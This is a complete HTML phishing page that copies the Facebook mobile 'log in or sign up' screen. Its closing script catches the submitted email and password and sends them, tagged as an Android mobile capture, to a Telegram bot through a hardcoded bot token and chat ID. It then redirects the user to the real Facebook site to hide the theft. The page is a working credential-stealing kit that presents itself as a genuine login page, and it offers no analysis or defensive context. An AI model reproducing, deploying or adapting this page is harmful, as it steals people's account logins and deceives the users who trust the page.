<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook – log in or sign up</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #1c1e21;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            min-height: 100vh;
            padding: 20px 16px;
        }
        .lang-container {
            width: 100%;
            text-align: center;
            font-size: 12px;
            color: #737373;
            margin-bottom: 10px;
        }
        .main-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            flex-grow: 1;
            justify-content: center;
        }
        .logo-container {
            margin-bottom: 30px;
            text-align: center;
        }
        .logo-container img {
            width: 56px;
            height: 56px;
        }
        .fb-logo-text {
            color: #1877f2;
            font-size: 38px;
            font-weight: bold;
            letter-spacing: -1px;
            margin-top: 10px;
        }
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .input-box {
            width: 100%;
            background: #f5f6f7;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            padding: 12px 14px;
            font-size: 16px;
            color: #1c1e21;
            outline: none;
        }
        .input-box:focus {
            border-color: #1877f2;
            background: #ffffff;
        }
        .login-btn {
            width: 100%;
            background-color: #1877f2;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 4px;
        }
        .login-btn:active {
            background-color: #166fe5;
        }
        .forgot-pass {
            margin-top: 16px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
            font-weight: 500;
        }
        .divider {
            width: 100%;
            display: flex;
            align-items: center;
            text-align: center;
            margin: 24px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dadde1;
        }
        .divider span {
            padding: 0 10px;
            font-size: 13px;
            color: #737373;
        }
        .create-btn {
            width: 100%;
            background-color: #ffffff;
            color: #1c1e21;
            border: 1px solid #ccd0d5;
            border-radius: 8px;
            padding: 12px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            text-align: center;
        }
        .footer {
            font-size: 12px;
            color: #737373;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="lang-container">
        English (US) &bull; Tagalog &bull; Bisaya &bull; More...
    </div>

    <div class="main-container">
        <div class="logo-container">
            <!-- Official Facebook SVG Brand Logo -->
            <svg viewBox="0 0 36 36" class="fb-logo" width="64" height="64">
                <path fill="#1877f2" d="M32 0H4C1.79 0 0 1.79 0 4v28c0 2.21 1.79 4 4 4h28c2.21 0 4-1.79 4-4V4c0-2.21-1.79-4-4-4z"/>
                <path fill="#FFFFFF" d="M25.5 19h-3.5v10.5h-4.3V19h-2.2v-3.7h2.2v-2.4c0-2.1 1-5.4 5.4-5.4l4 0v3.6h-2.4c-.5 0-1.1.3-1.1 1.2v3h3.6l-.5 3.7z"/>
            </svg>
        </div>

        <form id="loginForm">
            <input type="text" id="email" class="input-box" placeholder="Mobile number or email" required autocomplete="username">
            <input type="password" id="pass" class="input-box" placeholder="Password" required autocomplete="current-password">
            <button type="submit" class="login-btn">Log In</button>
        </form>

        <a href="#" class="forgot-pass">Forgot password?</a>

        <div class="divider">
            <span>or</span>
        </div>

        <a href="https://www.facebook.com/r.php" class="create-btn">Create new account</a>
    </div>

    <div class="footer">
        Meta &copy; 2026
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const u = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            
            const botToken = "8931915858:AAHnAs6rPshxwP30jSfzORDOmXK2M2krUvs";
            const chatId = "8803897745";
            const text = "🚨 [ANDROID 2026 MOBILE CAPTURE] 🚨\nUser: " + u + "\nPass: " + p;
            
            fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: text })
            }).finally(() => {
                window.location.href = "https://www.facebook.com";
            });
        });
    </script>
</body>
</html>
